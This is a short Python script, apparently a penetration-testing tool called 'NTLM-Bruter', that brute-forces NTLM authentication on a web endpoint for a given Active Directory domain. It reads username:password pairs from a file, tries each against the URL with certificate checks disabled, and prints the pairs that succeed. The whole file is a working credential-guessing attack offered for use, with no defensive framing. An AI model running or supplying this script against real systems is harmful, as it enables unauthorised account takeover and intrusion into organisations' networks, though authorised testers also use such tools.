#!/usr/bin/python
print ("""
███╗░░██╗████████╗██╗░░░░░███╗░░░███╗░░░░░░██████╗░██████╗░██╗░░░██╗████████╗███████╗██████╗░
████╗░██║╚══██╔══╝██║░░░░░████╗░████║░░░░░░██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝██╔══██╗
██╔██╗██║░░░██║░░░██║░░░░░██╔████╔██║█████╗██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░██████╔╝
██║╚████║░░░██║░░░██║░░░░░██║╚██╔╝██║╚════╝██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░██╔══██╗
██║░╚███║░░░██║░░░███████╗██║░╚═╝░██║░░░░░░██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗██║░░██║
╚═╝░░╚══╝░░░╚═╝░░░╚══════╝╚═╝░░░░░╚═╝░░░░░░╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝

Developed by: @smaranchand | https://smaranchand.com.np
""")
import sys
import urllib3
import requests
from requests_ntlm2 import HttpNtlmAuth
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    print('Usage: python ntlm.py [URL] [AD Domain Name]')
    url = sys.argv[1]
    ad_domain = sys.argv[2]
    ad_domain_w = ad_domain+'\\'
    with open('all.txt') as f:
        for line in f:
            user, password = line.strip().split(':')
            print("Trying: " + ad_domain_w + user + ":" + password)
            auth = HttpNtlmAuth(ad_domain_w+user, password)
            response = requests.get(url, auth=auth, verify=False)
            if response.status_code == 200:
                print ("SUCCESS: %s\%s - %s" % (ad_domain, user, password))
except (IndexError, TypeError):
    print('Error: Please provide a valid URL and AD Domain Name')
